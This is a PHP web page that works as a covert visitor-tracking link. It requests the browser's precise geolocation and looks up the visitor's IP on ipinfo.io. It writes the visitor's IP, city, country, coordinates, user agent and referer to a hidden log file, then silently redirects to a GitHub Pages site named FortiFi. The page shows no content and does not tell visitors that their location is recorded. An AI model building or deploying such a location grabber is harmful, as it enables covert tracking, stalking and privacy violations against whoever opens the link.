<?php
session_start();
date_default_timezone_set('Asia/Kolkata');

function getUserIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = getUserIP();
$time = date("Y-m-d H:i:s");

$userLat = $_GET['lat'] ?? null;
$userLon = $_GET['lon'] ?? null;
$accuracy = $_GET['acc'] ?? "Unknown";

$lat = "Unknown";
$lon = "Unknown";
$city = "Unknown";
$country = "Unknown";
$source = "ip";

// Browser location
if ($userLat && $userLon) {
    $lat = $userLat;
    $lon = $userLon;
    $source = "browser";
}

// IP lookup (cURL)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ipinfo.io/{$ip}/json");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

if ($data) {
    $city = $data['city'] ?? "Unknown";
    $country = $data['country'] ?? "Unknown";

    if (!$userLat && isset($data['loc'])) {
        list($lat, $lon) = explode(",", $data['loc']);
    }
}

// Prevent duplicate logs
if (($userLat !== null || isset($_GET['fallback'])) && !isset($_SESSION['logged'])) {

    $logDir = __DIR__ . '/private_logs';
    if (!is_dir($logDir)) mkdir($logDir, 0755, true);

    $logFile = $logDir . '/visitors.log';

    $agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    $logLine = "Time: $time | Source: $source | IP: $ip | City: $city | Country: $country | Lat: $lat | Lon: $lon | Accuracy: $accuracy | Agent: $agent | Referer: $referer\n";

    file_put_contents($logFile, $logLine, FILE_APPEND);

    $_SESSION['logged'] = true;

    header("Location: https://shvtheamigo.github.io/FortiFi/");
    exit;
}
?>

<!DOCTYPE html>
<html>
<body>
<script>
(function () {

    let sent = false;

    function go(url){
        if(sent) return;
        sent = true;
        window.location.href = url;
    }

    if (!("geolocation" in navigator)) {
        go("?fallback=1");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        function (pos) {
            go("?lat=" + pos.coords.latitude +
               "&lon=" + pos.coords.longitude +
               "&acc=" + pos.coords.accuracy);
        },
        function () {
            go("?fallback=1");
        },
        {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        }
    );

})();
</script>
</body>
</html>
